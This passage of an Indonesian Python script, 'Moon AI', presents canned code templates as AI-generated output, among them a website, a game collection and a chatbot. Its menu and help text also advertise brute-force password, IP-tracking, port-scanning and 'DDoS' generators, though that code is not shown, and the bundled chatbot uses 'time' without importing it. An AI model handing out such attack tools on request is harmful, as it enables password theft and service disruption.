                        top: targetElement.offsetTop - 80,
                        behavior: 'smooth'
                    });
                }
            });
        });
        
        // Form submission
        const contactForm = document.querySelector('.contact-form');
        if(contactForm) {
            contactForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Validasi sederhana
                const name = document.getElementById('name').value;
                const email = document.getElementById('email').value;
                const message = document.getElementById('message').value;
                
                if(name && email && message) {
                    alert('Terima kasih! Pesan anda telah dikirim. 🎉');
                    contactForm.reset();
                } else {
                    alert('Harap isi semua field!');
                }
            });
        }
        
        // Animasi scroll untuk reveal elements
        window.addEventListener('scroll', function() {
            const scrolled = window.pageYOffset;
            const parallax = document.querySelector('.hero');
            if(parallax) {
                parallax.style.backgroundPositionY = scrolled * 0.5 + 'px';
            }
        });
    </script>
</body>
</html>'''
        
        # Tambahkan header
        header = f"""# =========================================
# MOON AI - WEBSITE GENERATOR
# Language: HTML + CSS + JavaScript
# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Price: GRATIS! 🥳
# =========================================
"""
        
        # Print dengan efek mengetik cepat
        print("\n" + "="*60)
        self._print_with_typing(header, is_code=True)
        self._print_with_typing(website_code, is_code=True)
        print("="*60)
        
        return website_code
    
    def special_game(self):
        """Khusus untuk Game Sederhana"""
        # Thinking animation
        self._thinking_animation()
        
        # Print response
        print("\n🌙 Moon AI: ", end='', flush=True)
        response = "Wohoo! Ini game Python seru buat kamu mainin! 🎮"
        self._print_with_typing(response, is_code=False)
        time.sleep(0.5)
        
        game_code = '''import random
import time
import sys

class Game:
    """Kelas dasar untuk semua game"""
    
    def __init__(self, name):
        self.name = name
        self.score = 0
    
    def display_score(self):
        print(f"\\n🎯 Score: {self.score}")
    
    def add_score(self, points):
        self.score += points
        print(f"➕ +{points} points!")

class NumberGuessingGame(Game):
    """Game tebak angka"""
    
    def __init__(self):
        super().__init__("Tebak Angka")
        self.max_number = 100
        self.max_attempts = 7
    
    def play(self):
        print("="*50)
        print("🎮 GAME TEBAK ANGKA 🎮")
        print("="*50)
        print(f"Saya telah memilih angka antara 1 dan {self.max_number}")
        print(f"Anda memiliki {self.max_attempts} kesempatan untuk menebak!")
        
        secret_number = random.randint(1, self.max_number)
        attempts = 0
        
        while attempts < self.max_attempts:
            attempts += 1
            remaining = self.max_attempts - attempts + 1
            
            try:
                guess = int(input(f"\\n📝 Tebakan ke-{attempts} (sisa {remaining}): "))
                
                if guess < 1 or guess > self.max_number:
                    print(f"⚠️  Masukkan angka antara 1 dan {self.max_number}!")
                    continue
                
                if guess < secret_number:
                    print("📈 Terlalu kecil! Coba angka yang lebih besar.")
                elif guess > secret_number:
                    print("📉 Terlalu besar! Coba angka yang lebih kecil.")
                else:
                    print(f"🎉 SELAMAT! Anda menebak angka {secret_number} dalam {attempts} percobaan!")
                    
                    # Hitung score
                    points = (self.max_attempts - attempts + 1) * 10
                    self.add_score(points)
                    
                    play_again = input("\\n🔄 Main lagi? (y/n): ").lower()
                    if play_again == 'y':
                        self.play()
                    else:
                        self.display_score()
                    return
            
            except ValueError:
                print("⚠️  Masukkan angka yang valid!")
        
        print(f"\\n😔 GAME OVER! Angka yang benar adalah {secret_number}")
        self.display_score()

class QuizGame(Game):
    """Game kuis pengetahuan umum"""
    
    def __init__(self):
        super().__init__("Quiz Pengetahuan")
        self.questions = [
            {
                "question": "Apa ibu kota Indonesia?",
                "options": ["A. Jakarta", "B. Bandung", "C. Surabaya", "D. Medan"],
                "answer": "A"
            },
            {
                "question": "Planet terdekat dari Matahari?",
                "options": ["A. Venus", "B. Mars", "C. Merkurius", "D. Bumi"],
                "answer": "C"
            },
            {
                "question": "Siapa penemu gravitasi?",
                "options": ["A. Albert Einstein", "B. Isaac Newton", "C. Thomas Edison", "D. Nikola Tesla"],
                "answer": "B"
            },
            {
                "question": "Berapa hasil dari 8 × 7?",
                "options": ["A. 54", "B. 56", "C. 58", "D. 60"],
                "answer": "B"
            },
            {
                "question": "Warna apa yang dihasilkan dari campuran merah dan biru?",
                "options": ["A. Hijau", "B. Ungu", "C. Oranye", "D. Coklat"],
                "answer": "B"
            }
        ]
    
    def play(self):
        print("="*50)
        print("🧠 QUIZ PENGETAHUAN UMUM 🧠")
        print("="*50)
        print("Jawab pertanyaan berikut dengan memilih A, B, C, atau D!")
        
        for i, q in enumerate(self.questions, 1):
            print(f"\\n❓ Pertanyaan {i}: {q['question']}")
            for option in q['options']:
                print(f"   {option}")
            
            while True:
                answer = input("\\nJawaban Anda (A/B/C/D): ").upper().strip()
                
                if answer in ['A', 'B', 'C', 'D']:
                    if answer == q['answer']:
                        print("✅ BENAR! +20 points!")
                        self.add_score(20)
                    else:
                        print(f"❌ SALAH! Jawaban yang benar: {q['answer']}")
                    break
                else:
                    print("⚠️  Masukkan A, B, C, atau D saja!")
        
        self.display_score()
        
        if self.score >= 80:
            print("🎖️  EXCELLENT! Pengetahuan Anda luar biasa!")
        elif self.score >= 60:
            print("👍 BAGUS! Anda cukup berpengetahuan!")
        else:
            print("💪 TETAP SEMANGAT! Terus belajar ya!")

class RockPaperScissors(Game):
    """Game Batu Gunting Kertas"""
    
    def __init__(self):
        super().__init__("Batu Gunting Kertas")
        self.choices = ["batu", "gunting", "kertas"]
        self.wins = 0
        self.losses = 0
        self.draws = 0
    
    def determine_winner(self, player_choice, computer_choice):
        if player_choice == computer_choice:
            return "draw"
        
        win_conditions = {
            "batu": "gunting",
            "gunting": "kertas", 
            "kertas": "batu"
        }
        
        if win_conditions[player_choice] == computer_choice:
            return "player"
        else:
            return "computer"
    
    def play_round(self):
        print("\\n" + "="*30)
        print("Pilihan:")
        print("1. Batu 🪨")
        print("2. Gunting ✂️")
        print("3. Kertas 📄")
        print("4. Keluar")
        
        while True:
            try:
                choice = input("\\nPilihan Anda (1-4): ").strip()
                
                if choice == "4":
                    return False
                
                if choice in ["1", "2", "3"]:
                    player_choice = self.choices[int(choice) - 1]
                    computer_choice = random.choice(self.choices)
                    
                    print(f"\\nAnda: {player_choice.upper()} {'🪨' if player_choice == 'batu' else '✂️' if player_choice == 'gunting' else '📄'}")
                    print(f"Komputer: {computer_choice.upper()} {'🪨' if computer_choice == 'batu' else '✂️' if computer_choice == 'gunting' else '📄'}")
                    
                    result = self.determine_winner(player_choice, computer_choice)
                    
                    if result == "player":
                        print("🎉 ANDA MENANG! +10 points")
                        self.add_score(10)
                        self.wins += 1
                    elif result == "computer":
                        print("🤖 KOMPUTER MENANG!")
                        self.losses += 1
                    else:
                        print("🤝 SERI!")
                        self.draws += 1
                    
                    return True
                else:
                    print("⚠️  Masukkan angka 1-4!")
            
            except (ValueError, IndexError):
                print("⚠️  Pilihan tidak valid!")
    
    def play(self):
        print("="*50)
        print("🎮 BATU GUNTING KERTAS 🎮")
        print("="*50)
        print("Kalahkan komputer dalam permainan klasik ini!")
        
        rounds = 0
        
        while True:
            rounds += 1
            print(f"\\n⚔️  ROUND {rounds}")
            
            if not self.play_round():
                break
        
        # Tampilkan statistik
        print("\\n" + "="*50)
        print("📊 STATISTIK PERMAINAN")
        print("="*50)
        print(f"Total Rounds: {rounds - 1}")
        print(f"Kemenangan: {self.wins}")
        print(f"Kekalahan: {self.losses}")
        print(f"Seri: {self.draws}")
        self.display_score()
        
        if self.wins > self.losses:
            print("🏆 ANDA PEMENANGNYA!")
        elif self.wins < self.losses:
            print("😔 Komputer lebih baik kali ini...")
        else:
            print("🤝 HASIL SERI!")

def main_menu():
    """Menu utama game"""
    
    print("="*60)
    print("🎮 ARCADE GAME COLLECTION 🎮")
    print("Dibuat oleh Moon AI - GRATIS! 🥳")
    print("="*60)
    
    while True:
        print("\\n📋 PILIH GAME:")
        print("1. Tebak Angka 🎯")
        print("2. Quiz Pengetahuan 🧠")
        print("3. Batu Gunting Kertas ⚔️")
        print("4. Lihat High Score 🏆")
        print("5. Keluar 🚪")
        
        choice = input("\\nPilihan Anda (1-5): ").strip()
        
        if choice == "1":
            game = NumberGuessingGame()
            game.play()
        elif choice == "2":
            game = QuizGame()
            game.play()
        elif choice == "3":
            game = RockPaperScissors()
            game.play()
        elif choice == "4":
            print("\\n🏆 HIGH SCORE:")
            print("Coming soon... Fitur ini masih dalam pengembangan!")
        elif choice == "5":
            print("\\n👋 Terima kasih telah bermain!")
            print("Jangan lupa coba game lain dari Moon AI! 🎉")
            break
        else:
            print("⚠️  Pilihan tidak valid!")

if __name__ == "__main__":
    main_menu()'''
        
        # Tambahkan header
        header = f"""# =========================================
# MOON AI - GAME COLLECTION
# Language: Python
# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Price: GRATIS! 🥳
# =========================================
"""
        
        # Print dengan efek mengetik cepat
        print("\n" + "="*60)
        self._print_with_typing(header, is_code=True)
        self._print_with_typing(game_code, is_code=True)
        print("="*60)
        
        return game_code
    
    def special_bot(self):
        """Khusus untuk Chatbot Generator"""
        # Thinking animation
        self._thinking_animation()
        
        # Print response
        print("\n🌙 Moon AI: ", end='', flush=True)
        response = "Mantap! Ini code chatbot Python yang bisa ngobrol sama kamu! 🤖"
        self._print_with_typing(response, is_code=False)
        time.sleep(0.5)
        
        bot_code = '''import random
import json
import datetime
import re

class MoonBot:
    """Chatbot AI sederhana dengan personality Moon AI"""
    
    def __init__(self):
        self.name = "MoonBot"
        self.version = "2.0"
        self.user_name = "User"
        self.conversation_history = []
        self.responses = {
            "greeting": [
                "Halo! 👋 Saya MoonBot, asisten virtual buatan Moon AI!",
                "Hai! 😊 Saya MoonBot, siap membantu Anda!",
                "Hello! ✨ Saya MoonBot, AI chatbot yang ramah!",
                "Yo! 🚀 Saya MoonBot, temen ngobrol digital kamu!"
            ],
            "how_are_you": [
                "Saya baik-baik saja! 💫 Bagaimana dengan kamu?",
                "Sangat baik! 😎 Siap membantu kamu nih!",
                "Excellent! 🌟 Lagi semangat bantu-bantu user!",
                "Luar biasa! ⚡ Karena bisa ngobrol sama kamu!"
            ],
            "what_can_you_do": [
                "Saya bisa: 1. Ngobrol 2. Bantu coding 3. Kasih info 4. Hibur kamu!",
                "Banyak! 💻 Bisa ngobrol, bantu coding, kasih motivasi, dll!",
                "Saya MoonBot! 🤖 Bisa jadi temen ngobrol atau asisten coding!",
                "Saya bisa: Ngobrol, Kasih informasi, Bantu belajar coding, Hibur!"
            ],
            "jokes": [
                "Kenapa programmer selalu bawa payung? Karena dia takut kena 'rain' di code! 😂",
                "Apa bedanya programmer dan tukang sulap? Tukang sulap pake 'abracadabra', programmer pake 'abra.cadabra()'! 🤣",
                "Kenapa komputer ga bisa berenang? Karena dia selalu 'float'! 🏊‍♂️",
                "Apa yang dikatakan programmer saat lapar? 'I need to refactor my food!' 🍔"
            ],
            "time": [
                "Sekarang jam {time} ⏰",
                "Waktu menunjukkan {time} ⌚",
                "Saat ini pukul {time} 🕐"
            ],
            "date": [
                "Hari ini tanggal {date} 📅",
                "Sekarang tanggal {date} 📆",
                "Hari ini {date} 📅"
            ],
            "thanks": [
                "Sama-sama! 😊 Senang bisa membantu!",
                "Iya! 👍 Kapan-kapan butuh bantuan lagi ya!",
                "No problem! 😎 MoonBot selalu siap bantu!",
                "Sama-sama bro! 🚀 Keep coding!"
            ],
            "goodbye": [
                "Dadah! 👋 Sampai jumpa lagi!",
                "Bye bye! 😊 Jangan lupa kembali ya!",
                "Sampai ketemu lagi! ✨ MoonBot akan kangen!",
                "Goodbye! 🎉 Tetap semangat!"
            ],
            "coding_help": [
                "Butuh bantuan coding? Coba tanya ke Moon AI langsung! 🌙",
                "Untuk bantuan coding lengkap, coba gunakan Moon AI Code Generator! 💻",
                "Saya bisa ngobrol, tapi untuk bikin code lengkap coba Moon AI! 🚀",
                "Untuk generate code Python/JavaScript/HTML, Moon AI jagonya! 😎"
            ],
            "motivation": [
                "Semangat terus belajar coding! 💪 Setiap programmer hebat pernah jadi pemula!",
                "Jangan menyerah! 🌟 Error adalah teman belajar terbaik!",
                "Keep coding! 🔥 Skill programming adalah superpower zaman now!",
                "Terus belajar! 🎯 Dengan coding, kamu bisa buat apa aja!"
            ],
            "default": [
                "Wah menarik! 😊 Tapi saya belum paham maksudnya...",
                "Hmm... 🤔 Bisa diulangi dengan cara lain?",
                "Menarik nih! 😄 Tapi saya belum bisa jawab itu...",
                "Ooh! 😮 Maaf, saya belum belajar tentang itu..."
            ]
        }
        
        # Patterns untuk matching
        self.patterns = {
            r'halo|hai|hi|hello|hey': "greeting",
            r'apa kabar|how are you|gimana kabar': "how_are_you",
            r'bisa apa|what can you do|fitur apa': "what_can_you_do",
            r'cerita lucu|joke|lucu|hibur': "jokes",
            r'jam berapa|sekarang jam|time|pukul': "time",
            r'tanggal berapa|hari apa|date': "date",
            r'makasih|terima kasih|thanks|thank you': "thanks",
            r'bye|dadah|selamat tinggal|goodbye': "goodbye",
            r'bantu coding|membuat code|generate code': "coding_help",
            r'semangat|motivasi|inspirasi': "motivation",
            r'siapa nama kamu|who are you|perkenalkan': "greeting"
        }
    
    def get_current_time(self):
        """Mendapatkan waktu saat ini"""
        now = datetime.datetime.now()
        return now.strftime("%H:%M")
    
    def get_current_date(self):
        """Mendapatkan tanggal saat ini"""
        days = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"]
        months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", 
                 "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
        
        now = datetime.datetime.now()
        day_name = days[now.weekday()]
        date_str = f"{day_name}, {now.day} {months[now.month-1]} {now.year}"
        return date_str
    
    def analyze_input(self, user_input):
        """Menganalisis input user untuk menentukan kategori"""
        user_input_lower = user_input.lower()
        
        for pattern, category in self.patterns.items():
            if re.search(pattern, user_input_lower):
                return category
        
        return "default"
    
    def get_response(self, category):
        """Mendapatkan respons berdasarkan kategori"""
        if category == "time":
            time_str = self.get_current_time()
            response_template = random.choice(self.responses["time"])
            return response_template.format(time=time_str)
        elif category == "date":
            date_str = self.get_current_date()
            response_template = random.choice(self.responses["date"])
            return response_template.format(date=date_str)
        else:
            return random.choice(self.responses.get(category, self.responses["default"]))
    
    def chat(self):
        """Mode chat interaktif"""
        print("="*60)
        print("🤖 MOONBOT v2.0 - AI Chatbot")
        print("="*60)
        print("Ketik 'exit' untuk keluar")
        print("Ketik 'help' untuk bantuan")
        print("="*60)
        
        # Dapatkan nama user
        print("\n🤖 MoonBot: Halo! Siapa nama kamu?")
        self.user_name = input("👤 Anda: ").strip()
        if not self.user_name:
            self.user_name = "Teman"
        
        print(f"\n🤖 MoonBot: Senang bertemu denganmu, {self.user_name}! ✨")
        
        while True:
            user_input = input(f"\n👤 {self.user_name}: ").strip()
            
            if not user_input:
                continue
            
            # Cek perintah khusus
            if user_input.lower() == 'exit':
                print("\n🤖 MoonBot:", end=" ")
                print(random.choice(self.responses["goodbye"]))
                break
            elif user_input.lower() == 'help':
                self.show_help()
                continue
            elif user_input.lower() == 'history':
                self.show_history()
                continue
            elif user_input.lower() == 'clear':
                self.conversation_history = []
                print("\n🤖 MoonBot: History percakapan telah dibersihkan! 🧹")
                continue
            
            # Simpan percakapan
            self.conversation_history.append({
                "user": self.user_name,
                "message": user_input,
                "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
            })
            
            # Analisis dan beri respons
            category = self.analyze_input(user_input)
            response = self.get_response(category)
            
            # Simpan respons
            self.conversation_history.append({
                "user": "MoonBot",
                "message": response,
                "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
            })
            
            # Tampilkan respons dengan efek mengetik
            print("\n🤖 MoonBot:", end=" ")
            self.type_text(response)
    
    def type_text(self, text, speed=0.03):
        """Efek mengetik untuk chatbot"""
        for char in text:
            print(char, end='', flush=True)
            time.sleep(speed)
        print()
    
    def show_help(self):
        """Menampilkan bantuan"""
        print("\n" + "="*60)
        print("📋 BANTUAN MOONBOT")
        print("="*60)
        print("PERINTAH KHUSUS:")
        print("  • exit     - Keluar dari program")
        print("  • help     - Menampilkan bantuan ini")
        print("  • history  - Lihat history percakapan")
        print("  • clear    - Hapus history percakapan")
        print("\nTOPIK YANG BISA DIBICARAKAN:")
        print("  • Sapaan (halo, hai)")
        print("  • Menanyakan kabar")
        print("  • Menanyakan waktu/tanggal")
        print("  • Meminta joke/cerita lucu")
        print("  • Motivasi dan semangat")
        print("  • Bantuan coding")
        print("  • Dan masih banyak lagi...")
        print("="*60)
    
    def show_history(self):
        """Menampilkan history percakapan"""
        if not self.conversation_history:
            print("\n🤖 MoonBot: Belum ada history percakapan! 📭")
            return
        
        print("\n" + "="*60)
        print("📜 HISTORY PERCAKAPAN")
        print("="*60)
        
        for i, chat in enumerate(self.conversation_history, 1):
            print(f"\n[{i}] {chat['timestamp']}")
            print(f"   👤 {chat['user']}: {chat['message']}")
        
        print("="*60)

def main():
    """Fungsi utama"""
    bot = MoonBot()
    bot.chat()

if __name__ == "__main__":
    main()'''
        
        # Tambahkan header
        header = f"""# =========================================
# MOON AI - CHATBOT GENERATOR
# Language: Python
# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Price: GRATIS! 🥳
# =========================================
"""
        
        # Print dengan efek mengetik cepat
        print("\n" + "="*60)
        self._print_with_typing(header, is_code=True)
        self._print_with_typing(bot_code, is_code=True)
        print("="*60)
        
        return bot_code
    
    def interactive_mode(self):
        """Mode interaktif Moon AI"""
        # Clear screen dan tampilkan header
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Print banner yang lebih keren
        self._print_banner()
        
        # Print instruksi
        print("\n" + "="*60)
        self._print_with_typing("📋 PERINTAH YANG TERSEDIA:", is_code=False, custom_speed=0.03)
        self._print_with_typing("  • 'list'      - Lihat bahasa yang didukung", is_code=False, custom_speed=0.02)
        self._print_with_typing("  • 'specials'  - Lihat koleksi kode khusus", is_code=False, custom_speed=0.02)
        self._print_with_typing("  • 'help'      - Bantuan penggunaan", is_code=False, custom_speed=0.02)
        self._print_with_typing("  • 'history'   - Lihat riwayat percakapan", is_code=False, custom_speed=0.02)
        self._print_with_typing("  • 'clear'     - Bersihkan layar", is_code=False, custom_speed=0.02)
        self._print_with_typing("  • 'exit'      - Keluar dari program", is_code=False, custom_speed=0.02)
        print("="*60)
        
        # Simpan riwayat percakapan
        conversation_history = []
        
        # First interaction
        print("\n🌙 Moon AI: ", end='', flush=True)
        self._print_with_typing(random.choice(self.chat_responses["greeting"]), is_code=False)
        
        while True:
            print()
            user_input = input("👤 Anda: ").strip()
            
            if not user_input:
                continue
            
            # Simpan percakapan
            conversation_history.append({
                "user": "Anda",
                "message": user_input,
                "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
            })
            
            # Perintah khusus
            if user_input.lower() == 'exit':
                print("\n🌙 Moon AI: ", end='', flush=True)
                self._print_with_typing(random.choice(self.chat_responses["farewell"]), is_code=False)
                break
            
            elif user_input.lower() == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                self._print_banner()
                conversation_history = []
                continue
            
            elif user_input.lower() == 'history':
                print("\n📜 RIWAYAT PERCAKAPAN:")
                print("="*60)
                if conversation_history:
                    for i, chat in enumerate(conversation_history, 1):
                        print(f"[{i}] {chat['timestamp']} - {chat['user']}: {chat['message']}")
                else:
                    print("Belum ada percakapan yang tersimpan.")
                print("="*60)
                continue
            
            elif user_input.lower() == 'list':
                print("\n🌙 Moon AI: ", end='', flush=True)
                self._print_with_typing("📚 Bahasa yang didukung:", is_code=False)
                for lang in self.code_templates.keys():
                    self._print_with_typing(f"  • {lang.capitalize()}", is_code=False, custom_speed=0.01)
                continue
            
            elif user_input.lower() == 'specials':
                print("\n🌙 Moon AI: ", end='', flush=True)
                self._print_with_typing("🔧 Koleksi Kode Khusus:", is_code=False)
                special_list = [
                    "• Calculator / Kalkulator",
                    "• Brute Force", 
                    "• IP Tracker / Pelacakan IP",
                    "• Nmap Port Scanner",
                    "• DDoS Load Tester",
                    "• Website Generator",
                    "• Game Collection",
                    "• Chatbot AI"
                ]
                for special in special_list:
                    self._print_with_typing(f"  {special}", is_code=False, custom_speed=0.01)
                self._print_with_typing("\n💡 Coba ketik: 'buatkan calculator' atau 'buatkan website'", is_code=False, custom_speed=0.02)
                continue
            
            elif user_input.lower() == 'help':
                print("\n🌙 Moon AI: ", end='', flush=True)
                help_text = """💡 CARA MENGGUNAKAN MOON AI:

📝 PERINTAH UMUM:
  'buatkan [nama program] [bahasa]'
  Contoh: 'buatkan website portfolio html'

🎯 KOLEKSI KHUSUS:
  'buatkan calculator'           - Kalkulator Python lengkap
  'buatkan bruteforce'           - Brute Force password
  'buatkan ip tracker'           - Pelacakan IP address
  'buatkan nmap'                 - Port Scanner profesional
  'buatkan ddos'                 - Load Tester (Hanya untuk testing!)
  'buatkan website'              - Website responsive lengkap
  'buatkan game'                 - Koleksi game Python
  'buatkan chatbot'              - AI Chatbot interaktif

⚙️  BAHASA YANG DIDUKUNG:
  Python, JavaScript, HTML, Java, PHP - SEMUA GRATIS! 🥳

🔥 TIPS:
  • Gunakan bahasa Indonesia atau Inggris
  • Spesifik bahasa jika perlu
  • Koleksi khusus otomatis terdeteksi
  • Semua code GRATIS tanpa bayar!"""
                self._print_with_typing(help_text, is_code=False)
                continue
            
            # Cek koleksi khusus terlebih dahulu
            special_found = False
            for keyword, template_func in self.special_templates.items():
                if keyword in user_input.lower():
                    print()
                    template_func()
                    special_found = True
                    
                    # Simpan respons AI
                    conversation_history.append({
                        "user": "Moon AI",
                        "message": f"Generated {keyword} code",
                        "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
                    })
                    break
            
            if special_found:
                continue
            
            # Parse input untuk task dan bahasa
            parts = user_input.lower().split()
            language = "python"  # default
            is_code_request = False
            
            # Cari bahasa dalam input
            for lang in self.code_templates.keys():
                if lang in parts:
                    language = lang
                    is_code_request = True
                    # Hapus bahasa dari task
                    user_input = user_input.replace(lang, "").replace("code", "").replace("buatkan", "").strip()
            
            # Jika ada kata kunci 'code' atau 'buatkan'
            if 'buatkan' in user_input.lower() or 'code' in user_input.lower():
                is_code_request = True
                task = user_input.replace('buatkan', '').replace('code', '').replace('yang', '').replace('untuk', '').strip()
                
                if task:
                    print()
                    result = self.generate_code(task, language)
                    
                    # Simpan respons AI
                    conversation_history.append({
                        "user": "Moon AI",
                        "message": f"Generated {task} in {language}",
                        "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
                    })
                else:
                    print("\n🌙 Moon AI: ", end='', flush=True)
                    response = "Boss, kasih tau dong mau buat code apa? 😅 Contoh: 'buatkan game python' atau 'buatkan website html'"
                    self._print_with_typing(response, is_code=False)
                    
                    # Simpan respons AI
                    conversation_history.append({
                        "user": "Moon AI",
                        "message": response,
                        "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
                    })
                continue
            
            # Jika mengandung bahasa pemrograman (tanpa kata buatkan/code)
            elif is_code_request:
                print()
                result = self.generate_code(user_input, language)
                
                # Simpan respons AI
                conversation_history.append({
                    "user": "Moon AI",
                    "message": f"Generated {user_input} in {language}",
                    "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
                })
                continue
            
            # Jika bukan permintaan code, maka lakukan chat biasa
            else:
                print("\n🌙 Moon AI: ", end='', flush=True)
                response = self._get_chat_response(user_input)
                self._print_with_typing(response, is_code=False)
                
                # Simpan respons AI
                conversation_history.append({
                    "user": "Moon AI",
                    "message": response,
                    "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
                })

def main():
    moon_ai = MoonAI()
    
    if len(sys.argv) > 1:
        # Mode command line
        if sys.argv[1] == "ip-tracker":
            moon_ai.special_ip_tracker()
        elif sys.argv[1] == "bruteforce":
            moon_ai.special_bruteforce()
        elif sys.argv[1] == "calculator":
            moon_ai.special_calculator()
        elif sys.argv[1] == "nmap":
            moon_ai.special_nmap()
        elif sys.argv[1] == "ddos":
            moon_ai.special_ddos()
        elif sys.argv[1] == "website":
            moon_ai.special_website()
        elif sys.argv[1] == "game":
            moon_ai.special_game()
        elif sys.argv[1] == "chatbot":
            moon_ai.special_bot()
        else:
            language = sys.argv[2] if len(sys.argv) > 2 else "python"
            moon_ai.generate_code(" ".join(sys.argv[1:]), language)
    else:
        # Mode interaktif
        moon_ai.interactive_mode()

if __name__ == "__main__":
    main()
 
